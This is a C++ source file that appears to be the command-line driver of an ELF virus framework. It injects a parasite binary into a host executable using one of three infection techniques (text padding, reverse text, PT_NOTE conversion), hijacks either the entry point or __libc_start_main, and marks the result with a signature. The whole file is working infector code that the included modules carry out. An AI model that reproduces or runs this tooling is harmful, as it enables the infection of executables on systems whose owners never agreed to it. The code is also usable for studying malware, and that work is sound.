#include "common/string.hh"
#include "infector/common_infection.hh"
#include "infector/padding_infector.hh"
#include "infector/pt_note_infector.hh"
#include "infector/reverse_text_infector.hh"
#include "nostdlib/stdio.hh"
#include "redirection/entry_point.hh"
#include "redirection/libc_start_main.hh"
#include "signature/elf_padding.hh"

const char* TEXT_PADDING = "text_padding";
const char* REVERSE_TEXT = "reverse_text";
const char* PT_NOTE_TO_LOAD = "pt_note";

const char* ENTRY_POINT = "entry_point";
const char* LIBC_MAIN_START = "libc_main_start";

// This must be adjusted according to the startup code.
constexpr size_t VIRUS_START = 44;

// Usage %s <host> <parasite> <infection method> <redirection method>
int main(int argc, char** argv) {
  if (argc != 5) {
    vf::printf(
        "Not enough arguments. Usage: <host> <parasite> <infection method> "
        "<redirection method>\n");
    return EXIT_FAILURE;
  }

  vf::common::String infect(argv[3]);
  vf::common::String redirect(argv[4]);
  bool ret = false;

  // By default, use the elf magic array padding signer.
  using SignerT = vf::signature::ElfHeaderPaddingSigner;
  if (infect == TEXT_PADDING) {
    if (redirect == ENTRY_POINT) {
      ret = vf::infector::infect<vf::infector::PaddingInfector,
                                 vf::redirection::EntryPointPatcher, SignerT>(
          argv[1], argv[2], VIRUS_START);
    } else if (redirect == LIBC_MAIN_START) {
      ret =
          vf::infector::infect<vf::infector::PaddingInfector,
                               vf::redirection::LibcStartMainPatcher, SignerT>(
              argv[1], argv[2], VIRUS_START);
    } else {
      vf::printf("Unsupported redirection: %s\n", redirect.c_str());
    }
  } else if (infect == REVERSE_TEXT) {
    if (redirect == ENTRY_POINT) {
      ret = vf::infector::infect<vf::infector::ReverseTextInfector,
                                 vf::redirection::EntryPointPatcher, SignerT>(
          argv[1], argv[2], VIRUS_START);
    } else if (redirect == LIBC_MAIN_START) {
      ret =
          vf::infector::infect<vf::infector::ReverseTextInfector,
                               vf::redirection::LibcStartMainPatcher, SignerT>(
              argv[1], argv[2], VIRUS_START);
    } else {
      vf::printf("Unsupported redirection: %s\n", redirect.c_str());
    }
  } else if (infect == PT_NOTE_TO_LOAD) {
    if (redirect == ENTRY_POINT) {
      ret = vf::infector::infect<vf::infector::PtNoteInfector,
                                 vf::redirection::EntryPointPatcher, SignerT>(
          argv[1], argv[2], VIRUS_START);
    } else if (redirect == LIBC_MAIN_START) {
      ret =
          vf::infector::infect<vf::infector::PtNoteInfector,
                               vf::redirection::LibcStartMainPatcher, SignerT>(
              argv[1], argv[2], VIRUS_START);
    } else {
      vf::printf("Unsupported redirection: %s\n", redirect.c_str());
    }
  } else {
    vf::printf("Unsupported infection: %s\n", infect.c_str());
  }

  return ret ? EXIT_SUCCESS : EXIT_FAILURE;
}